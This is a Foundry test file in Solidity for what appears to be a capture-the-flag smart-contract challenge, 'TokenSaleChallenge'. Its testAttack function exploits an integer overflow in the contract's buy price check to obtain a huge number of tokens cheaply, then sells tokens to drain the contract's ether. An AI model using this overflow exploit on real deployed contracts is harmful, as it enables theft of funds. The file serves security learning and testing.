// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
 // note we need an older compiler as the latest has fixed the over/under flow issues
 // this source will not compile with later versions

import "forge-std/Test.sol";
import "source/math/TokenSale.sol";

contract TokenSaleTest is Test {

  TokenSaleChallenge tokenSaleChallenge;

  address account1;
  address account2;

  function setUp() public {
    account1 = vm.addr(1);
    vm.label(account1, "Account1[address]");
    vm.deal(account1, 10 ether);

    tokenSaleChallenge = new TokenSaleChallenge{value: 1 ether}();
    vm.label(address(tokenSaleChallenge), "TokenSaleChallenge[contract]");
    vm.startPrank(account1);
  }

  function testCorrectWithdraw() public {

    // add smart contract function calls here
    tokenSaleChallenge.buy{value: 10 ether}(10);
    tokenSaleChallenge.sell(10);

    // bought 10, sold 10
    uint expectedAccountBalance = 10 * (1 ether);
    assertEq((account1.balance), expectedAccountBalance );
    // 1 fromm the deployment
    uint expectedContractBalance = 1 * (1 ether);
    assertEq(address(tokenSaleChallenge).balance, expectedContractBalance );

    console.log(account1.balance);
    console.log(address(tokenSaleChallenge).balance);
  }
  
  function testAttack() public {
    // correct, costs 1 ether, returns 2

    // attach is to overflow the buy functions require check [msg.value == numTokens * PRICE_PER_TOKEN]
    // we can overflow 
    uint256 maxUint = type(uint256).max;
    uint256 overflowed = (maxUint / 1e18) + 1;
    tokenSaleChallenge.buy{value: overflowed * 1e18  }(overflowed);

    uint256 hackedBalance = address(tokenSaleChallenge).balance;

    tokenSaleChallenge.sell(hackedBalance / 1 ether);
    uint256 withdrawn = address(tokenSaleChallenge).balance;

    assertTrue(tokenSaleChallenge.isComplete());

    console.log(maxUint);
    console.log(overflowed);
    console.log(hackedBalance);
    console.log(withdrawn);
    console.log(account1.balance);
    console.log(address(tokenSaleChallenge).balance);
  }

  fallback() external payable { }
  receive() external payable { }
}

